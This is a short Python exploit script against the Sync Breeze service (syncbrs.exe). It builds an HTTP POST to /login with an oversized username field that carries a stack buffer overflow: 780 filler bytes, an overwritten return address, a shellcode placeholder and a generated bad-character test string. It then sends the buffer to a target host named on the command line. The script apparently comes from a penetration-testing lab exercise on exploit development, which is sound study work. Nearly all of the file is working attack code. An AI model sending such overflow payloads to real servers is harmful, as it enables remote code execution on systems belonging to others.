#!/usr/bin/python3

"""
exploited service: syncbrs.exe

payload
===========
len4 - EBP
len4 - RET
len779 - trash
===========

Found badchars:
python3 badchar.py g --bad "3d 26 25 0d 0a"

Found encoded chars:
-> Modified characters:  [0x2b '+' => 0x20 '\x20',]
"""
from badbyte.utils.functions import analyze, generate_characters

import socket
import sys
try:
    server = sys.argv[1]
    port = 80
    size = 1200
    payload = generate_characters(prefix=b"START", postfix=b"STOP", bad=[0x3d, 0x26, 0x25, 0x0d])
    print(f"Generated payload: {payload}")
    payload = b"A"*780 + b"\xef\xbe\xad\xde" + b"A"*4 + b"SHELLCODE" + payload
    content = b"username=" + payload + b"&password=A"
    buffer = b"POST /login HTTP/1.1\r\n"
    buffer += b"Host: " + server.encode() + b"\r\n"
    buffer += b"User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101Firefox/52.0\r\n"
    buffer += b"Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
    buffer += b"Accept-Language: en-US,en;q=0.5\r\n"
    buffer += b"Referer: http://10.11.0.22/login\r\n"
    buffer += b"Connection: close\r\n"
    buffer += b"Content-Type: application/x-www-form-urlencoded\r\n"
    buffer += b"Content-Length: "+ str(len(content)).encode() + b"\r\n"
    buffer += b"\r\n"
    buffer += content
    print("Sending evil buffer...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))
    s.send(buffer)
    s.close()
    print("Done!")
except socket.error:
    print("Could not connect!")
